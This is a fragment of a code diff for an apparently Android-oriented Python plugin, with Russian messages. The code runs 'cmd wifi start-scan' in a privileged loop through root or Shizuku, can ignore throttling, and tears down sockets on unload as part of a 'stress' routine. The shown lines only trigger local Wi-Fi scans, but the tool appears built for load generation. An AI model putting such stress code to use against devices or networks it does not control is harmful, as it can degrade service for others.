+            if self.has_shizuku:
+                self.shizuku("cmd wifi start-scan")
+            elif self.has_root:
+                self.root("cmd wifi start-scan")
+            with self.stats_lock:
+                self.stats["l2"] += 1
+        except Exception as e:
+            self._record_error("L2 (Mixed)", e)
+
+    def _l2_worker(self, idx):
+        if not (self.has_root or self.has_shizuku):
+            self.toast("❌ L2 требует Root или Shizuku!")
+            self._log("L2 воркер остановлен: нет привилегий", "ERR")
+            return
+
+        cmd = "cmd wifi start-scan"
+        while not self.stop_flag:
+            try:
+                if self.has_shizuku:
+                    self.shizuku(cmd)
+                elif self.has_root:
+                    self.root(cmd)
+                else:
+                    self.shell(cmd)
+                time.sleep(1.0)
+                with self.stats_lock:
+                    self.stats["l2"] += 1
+                if not self.throttle_ignore:
+                    time.sleep(0.05)
+            except Exception as e:
+                self._record_error("L2", e)
+                break
+
+    def on_plugin_unload(self):
+        self._stop_stress()
+        with self.sockets_lock:
+            for sock in list(self.sockets):
+                self._safe_close_socket(sock)
+            self.sockets.clear()
